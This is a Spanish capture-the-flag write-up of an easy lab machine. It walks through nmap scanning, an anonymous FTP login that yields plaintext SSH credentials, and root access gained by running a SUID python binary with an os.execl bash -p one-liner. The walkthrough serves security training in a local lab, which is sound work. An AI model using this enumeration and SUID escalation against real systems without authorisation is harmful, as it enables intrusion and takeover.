---
layout: post
title: Anonymous
subtitle: Plataforma MiraSoyRoot Dificultad Fácil
cover-img: /assets/img/anonymous.png
thumbnail-img: /assets/img/anonymous.png
share-img: /assets/img/anonymous.png
author: Elmili72
---

![anonymous](https://github.com/user-attachments/assets/7f991e6c-c3c7-4204-b434-3982da3c2f8d)

## Escaneo general de puertos

Como siempre, para empezar realizamos un escaneo general de los puertos que pudieran estar abiertos en nuestra máquina.

```bash
❯ sudo nmap -sS -p- --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allports
Host is up, received arp-response (0.0000020s latency).
Scanned at 2025-06-23 16:51:45 CEST for 0s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 64
22/tcp open  ssh     syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)
```

## Escaneo específico de puertos

Conocidos los puertos abiertos podemos realizar un escaneo específico para conocer los servicios y las versiones. En este caso los puertos 21 (FTP) y 22 (SSH). Cabe destacar que nos permite el inicio de sesión con  el usuario *anonymous*, por lo que podemos entrar al servicio y exfiltrar información relevante.

```bash
❯ nmap -sCV -p21,22 172.17.0.2 -oN target
Host is up (0.000045s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 0        0              38 Feb 18 09:02 credenciales.txt
|_drwxrwxrwx    2 0        0            4096 Feb 18 09:02 uploads [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 172.17.0.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u4 (protocol 2.0)
| ssh-hostkey: 
|   256 bb:2c:f0:4d:f3:f1:66:9b:24:ac:ea:3a:b7:68:18:7c (ECDSA)
|_  256 be:1b:55:29:51:a5:94:3e:b0:fc:d9:b7:98:9d:06:c5 (ED25519)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

## Reconocimiento Servicio FTP

En la enumeración del FTP tenemos un archivo interesante que es *crendenciales.txt*. Que para nuestra suerte nos da crenciales como el propio nombre indica.

```bash
❯ ftp 172.17.0.2
Connected to 172.17.0.2.
220 (vsFTPd 3.0.3)
Name (172.17.0.2:elmili): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||23955|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              38 Feb 18 09:02 credenciales.txt
drwxrwxrwx    2 0        0            4096 Feb 18 09:02 uploads
226 Directory send OK.
ftp> get credenciales.txt
local: credenciales.txt remote: credenciales.txt
229 Entering Extended Passive Mode (|||48922|)
150 Opening BINARY mode data connection for credenciales.txt (38 bytes).
100% |*******************************************************************************************************************************|    38      537.81 KiB/s    00:00 ETA
226 Transfer complete.
38 bytes received in 00:00 (65.79 KiB/s)
```

```bash
❯ cat credenciales.txt
Usuario: yados
Contraseña: croissant
```

## Exploitación

Al no haber otra vulnerabilidad que nos permita lograr la intrusión probamos las credenciales directamente contra el SSH.
### Intrusión

Y estamos dentro del usuario *yados*.

```bash
❯ ssh yados@172.17.0.2
yados@172.17.0.2\'s password: 
Linux 7dec485919af 6.12.25-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.12.25-1kali1 (2025-04-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
yados@7dec485919af:~$ id
uid=1000(yados) gid=1000(yados) groups=1000(yados)
yados@7dec485919af:~$ whoami
yados
```

## Post-Explotación

Trar ver el archivo /etc/passwd y confirmar que no hay más usuarios para hacer pivoting pasamos directamente a la mejor parte de todo CTF. La escalada de privilegios :D.
### Escalada de Privilegios

No parece que exista la función *sudo*, por lo que directamente buscamos archivos con permisos *SUID*. Y vemos el binario */usr/local/bin/python*, así que vamos a explotarlo un poquito.

```bash
yados@7dec485919af:~$ find / -perm -4000 2>/dev/null
/usr/sbin/exim4
/usr/local/bin/python
/usr/bin/mount
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/su
/usr/bin/newgrp
/usr/bin/sudo
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helpe
```

También vemos el binario sudo pero al no tener permisos de sudoers no podemos hacer nada con él a simple vista, por lo que continuamos con el binario de python.

```bash
yados@7dec485919af:~$ /usr/bin/sudo /bin/bash -p
[sudo] password for yados: 
yados is not in the sudoers file.
This incident has been reported to the administrator.
```

Para el que no esté familiarizado con este tipo de escalada recomiendo *GTFOBins*, que puede ser nuestro mejor amigo en estos casos. Y conseguimos el usuario *root* y leer el archivo *mirasoyroot.txt*.

```bash
yados@7dec485919af:~$ cd /tmp
yados@7dec485919af:/tmp$ mkdir privesc && cd privesc
yados@7dec485919af:/tmp/privesc$ /usr/local/bin/python -c 'import os; os.execl("/bin/bash", "bash", "-p")'
bash-5.2# whoami
root
bash-5.2# id
uid=1000(yados) gid=1000(yados) euid=0(root) groups=1000(yados)
bash-5.2# cd /root
bash-5.2# cat mirasoyroot.txt 
felicidades hacker lo has conseguido, si eres de los 3 primeros en completar la maquina hablamé por Instagram y te pondré en el podio
```

¡Espero que os haya gustado y os haya servido de ayuda! ¡Hasta el próximo writeup!
